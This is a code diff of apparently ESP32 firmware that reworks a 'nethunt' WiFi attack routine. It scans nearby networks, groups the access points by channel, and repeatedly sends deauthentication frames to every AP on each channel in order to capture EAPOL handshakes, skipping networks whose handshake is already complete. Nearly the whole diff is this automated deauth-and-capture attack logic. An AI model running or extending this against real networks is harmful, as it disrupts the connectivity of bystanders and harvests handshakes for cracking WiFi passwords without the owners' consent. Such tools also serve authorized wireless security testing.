@@ -1,82 +1,55 @@
 #include "NethuntCommand.h"
 #include "../../net/WiFiHunter.h"
+#include <WiFi.h>
 #include <cstring>
 #include <cstdio>
 #include <cstdlib>
 
-static constexpr uint32_t HUNT_DWELL_MS    = 5000;
-static constexpr uint32_t DEAUTH_WAIT_MS   = 2000;
-static constexpr uint32_t DEAUTH_POST_MS   = 5000;
-static constexpr uint32_t EXHAUST_MS       = 60000;
-static constexpr uint8_t  DEAUTH_ROUNDS    = 3;
+static constexpr uint32_t DEAUTH_WAIT_MS = 5000;
+static constexpr uint32_t EXHAUST_MS     = 60000;
+static constexpr uint8_t  DEAUTH_ROUNDS  = 3;
 
 void NethuntCommand::init(WiFiHunter* hunter) { _hunter = hunter; }
 
 void NethuntCommand::startHardware() {
     if (!_hunter) return;
-    _channel   = 1;
-    _huntPhase = HuntPhase::SetChannel;
-    _hunter->resume();
-    _lastCaptureCount        = _hunter->captureCount();
-    _lastApFoundCount        = _hunter->apFoundCount();
-    _lastDeauthTargetCount   = _hunter->deauthTargetCount();
-    _lastEapolEventCount     = _hunter->eapolEventCount();
-    _lastExternalDeauthCount = _hunter->externalDeauthCount();
+    _huntPhase = HuntPhase::StartScan;
 }
 
 void NethuntCommand::stopService(IMenuHost& host) {
+    WiFi.scanDelete();
     if (_hunter) _hunter->pause();
     host.cmdPush("service nethunt stop");
 }
 
 void NethuntCommand::clearState() {
     _lastCaptureCount        = 0;
-    _lastApFoundCount        = 0;
-    _lastDeauthTargetCount   = 0;
     _lastEapolEventCount     = 0;
     _lastExternalDeauthCount = 0;
     _channel      = 1;
-    _deauthApIdx  = 0;
+    _channelMask  = 0;
     _deauthRound  = 0;
     _pauseUntilMs = 0;
-    _huntPhase    = HuntPhase::SetChannel;
+    _huntPhase    = HuntPhase::StartScan;
 }
 
-static int findApOnChannel(const WiFiHunter* hunter, uint8_t ch, uint8_t startIdx) {
-    uint8_t count = hunter->apCount();
-    for (uint8_t i = startIdx; i < count; i++) {
-        const WiFiHunter::ApInfo* ap = hunter->apInfoAt(i);
-        if (!ap || ap->channel != ch || ap->validated || ap->deauthCount >= DEAUTH_ROUNDS)
-            continue;
-        return (int)i;
-    }
-    return -1;
+// ── Helpers ───────────────────────────────────────────────────
+
+static uint8_t firstChannelInMask(uint16_t mask) {
+    for (uint8_t ch = 1; ch <= 13; ch++)
+        if (mask & (1u << ch)) return ch;
+    return 0;
 }
+
+// ── Update ────────────────────────────────────────────────────
 
 void NethuntCommand::update(IMenuHost& host, uint32_t ms) {
     if (!_hunter || host.menuIsOpen()) return;
 
-    _hunter->update(ms);
+    if (_huntPhase != HuntPhase::StartScan && _huntPhase != HuntPhase::Scanning)
+        _hunter->update(ms);
 
     // ── Event display ─────────────────────────────────────────
-    uint32_t afc = _hunter->apFoundCount();
-    if (afc > _lastApFoundCount) {
-        _lastApFoundCount = afc;
-        const char* ssid = _hunter->lastFoundSsid();
-        char buf[48];
-        snprintf(buf, sizeof(buf), "detected %.32s", (ssid && ssid[0]) ? ssid : "<hidden>");
-        host.outPush(buf);
-    }
-
-    uint32_t dtc = _hunter->deauthTargetCount();
-    if (dtc > _lastDeauthTargetCount) {
-        _lastDeauthTargetCount = dtc;
-        const char* dsid = _hunter->lastDeauthSsid();
-        char buf[48];
-        snprintf(buf, sizeof(buf), "deauth %.32s", (dsid && dsid[0]) ? dsid : "??");
-        host.cmdPush(buf);
-    }
-
     uint32_t eec = _hunter->eapolEventCount();
     if (eec > _lastEapolEventCount) {
         _lastEapolEventCount = eec;
@@ -113,93 +86,123 @@ void NethuntCommand::update(IMenuHost& host, uint32_t ms) {
     // ── State machine ─────────────────────────────────────────
     switch (_huntPhase) {
 
-    case HuntPhase::SetChannel:
-        _hunter->setChannel(_channel);
-        {
-            char buf[24];
-            snprintf(buf, sizeof(buf), "setchannel %d", _channel);
-            host.cmdPush(buf);
-        }
-        _pauseUntilMs = ms + HUNT_DWELL_MS;
-        _huntPhase    = HuntPhase::WaitChannel;
+    case HuntPhase::StartScan:
+        _hunter->clearFindings(ms);
+        _lastCaptureCount        = 0;
+        _lastEapolEventCount     = 0;
+        _lastExternalDeauthCount = 0;
+        _hunter->pause();
+        WiFi.scanNetworks(/*async=*/true);
+        host.cmdPush("scan wifi");
+        _huntPhase = HuntPhase::Scanning;
         break;
 
-    case HuntPhase::WaitChannel:
-        if (ms < _pauseUntilMs) break;
-        _huntPhase = HuntPhase::CheckChannel;
-        break;
-
-    case HuntPhase::CheckChannel: {
-        int idx = findApOnChannel(_hunter, _channel, 0);
-        if (idx < 0) {
-            if (_channel == 13) {
-                _hunter->clearFindings(ms);
-                _pauseUntilMs = ms + EXHAUST_MS;
-                _huntPhase    = HuntPhase::Exhaust;
-                host.cmdPush("nethunt exhaust 60");
-            } else {
-                _channel++;
-                _huntPhase = HuntPhase::SetChannel;
-            }
-        } else {
-            _deauthApIdx = (uint8_t)idx;
-            _deauthRound = 1;
-            _hunter->deauthApByIdx(_deauthApIdx);
-            _pauseUntilMs = ms + DEAUTH_WAIT_MS;
-            _huntPhase    = HuntPhase::Deauthing;
+    case HuntPhase::Scanning: {
+        int n = WiFi.scanComplete();
+        if (n == WIFI_SCAN_RUNNING) break;
+        _hunter->resume();
+        if (n < 0) n = 0;
+        for (int i = 0; i < n; i++) {
+            uint8_t* bssid = WiFi.BSSID(i);
+            if (!bssid) continue;
+            String  ssid = WiFi.SSID(i);
+            uint8_t ch   = (uint8_t)WiFi.channel(i);
+            _hunter->registerApFromScan(bssid, ssid.c_str(), ch);
         }
+        WiFi.scanDelete();
+        host.outPush("scan complete");
+        _huntPhase = HuntPhase::ScanDone;
         break;
     }
 
-    case HuntPhase::Deauthing:
-        if (ms < _pauseUntilMs) break;
-        {
-            const WiFiHunter::ApInfo* ap = _hunter->apInfoAt(_deauthApIdx);
-            if (ap && !ap->validated && _deauthRound < DEAUTH_ROUNDS) {
-                _hunter->deauthApByIdx(_deauthApIdx);
-                _deauthRound++;
-                if (_deauthRound < DEAUTH_ROUNDS) {
-                    _pauseUntilMs = ms + DEAUTH_WAIT_MS;
-                } else {
-                    _pauseUntilMs = ms + DEAUTH_POST_MS;
-                    _huntPhase    = HuntPhase::PostDeauth;
-                }
-            } else {
-                _pauseUntilMs = ms + DEAUTH_POST_MS;
-                _huntPhase    = HuntPhase::PostDeauth;
-            }
+    case HuntPhase::ScanDone: {
+        _channelMask = 0;
+        uint8_t total   = _hunter->apCount();
+        uint8_t ignored = 0;
+        uint8_t pending = 0;
+        for (uint8_t i = 0; i < total; i++) {
+            const WiFiHunter::ApInfo* ap = _hunter->apInfoAt(i);
+            if (!ap) continue;
+            if (ap->validated) { ignored++; continue; }
+            if (ap->channel >= 1 && ap->channel <= 13)
+                _channelMask |= (1u << ap->channel);
+            pending++;
         }
-        break;
-
-    case HuntPhase::PostDeauth:
-        if (ms < _pauseUntilMs) break;
-        _huntPhase = HuntPhase::NextWifi;
-        break;
-
-    case HuntPhase::NextWifi: {
-        int idx = findApOnChannel(_hunter, _channel, 0);
-        if (idx >= 0) {
-            _deauthApIdx = (uint8_t)idx;
-            _deauthRound = 1;
-            _hunter->deauthApByIdx(_deauthApIdx);
-            _pauseUntilMs = ms + DEAUTH_WAIT_MS;
-            _huntPhase    = HuntPhase::Deauthing;
-        } else if (_channel == 13) {
-            _hunter->clearFindings(ms);
+        uint8_t chanCount = 0;
+        for (uint8_t ch = 1; ch <= 13; ch++)
+            if (_channelMask & (1u << ch)) chanCount++;
+        {
+            char buf[52];
+            snprintf(buf, sizeof(buf), "found %d wifi across %d channel", pending, chanCount);
+            host.outPush(buf);
+        }
+        if (ignored > 0) {
+            char buf[56];
+            snprintf(buf, sizeof(buf), "ignore %d wifi (for having complete eapol)", ignored);
+            host.outPush(buf);
+        }
+        _channel = firstChannelInMask(_channelMask);
+        if (_channel == 0) {
             _pauseUntilMs = ms + EXHAUST_MS;
             _huntPhase    = HuntPhase::Exhaust;
             host.cmdPush("nethunt exhaust 60");
         } else {
-            _channel++;
             _huntPhase = HuntPhase::SetChannel;
         }
         break;
     }
 
+    case HuntPhase::SetChannel: {
+        _hunter->setChannel(_channel);
+        {
+            char buf[24];
+            snprintf(buf, sizeof(buf), "deauth channel %d", _channel);
+            host.cmdPush(buf);
+        }
+        uint8_t count = _hunter->apCount();
+        for (uint8_t i = 0; i < count; i++) {
+            const WiFiHunter::ApInfo* ap = _hunter->apInfoAt(i);
+            if (!ap || ap->channel != _channel || ap->validated) continue;
+            char buf[40];
+            snprintf(buf, sizeof(buf), "- %.36s", ap->ssid[0] ? ap->ssid : "??");
+            host.outPush(buf);
+        }
+        _deauthRound = 1;
+        _huntPhase   = HuntPhase::DeauthRound;
+        break;
+    }
+
+    case HuntPhase::DeauthRound:
+        _hunter->deauthAllOnChannel(_channel);
+        _pauseUntilMs = ms + DEAUTH_WAIT_MS;
+        _huntPhase    = HuntPhase::WaitRound;
+        break;
+
+    case HuntPhase::WaitRound:
+        if (ms < _pauseUntilMs) break;
+        if (_deauthRound < DEAUTH_ROUNDS) {
+            _deauthRound++;
+            _huntPhase = HuntPhase::DeauthRound;
+        } else {
+            _huntPhase = HuntPhase::NextChannel;
+        }
+        break;
+
+    case HuntPhase::NextChannel:
+        _channelMask &= ~(1u << _channel);
+        _channel = firstChannelInMask(_channelMask);
+        if (_channel != 0) {
+            _huntPhase = HuntPhase::SetChannel;
+        } else {
+            _pauseUntilMs = ms + EXHAUST_MS;
+            _huntPhase    = HuntPhase::Exhaust;
+            host.cmdPush("nethunt exhaust 60");
+        }
+        break;
+
     case HuntPhase::Exhaust:
         if (ms < _pauseUntilMs) break;
-        _channel   = 1;
-        _huntPhase = HuntPhase::SetChannel;
+        _huntPhase = HuntPhase::StartScan;
         break;
     }
 }
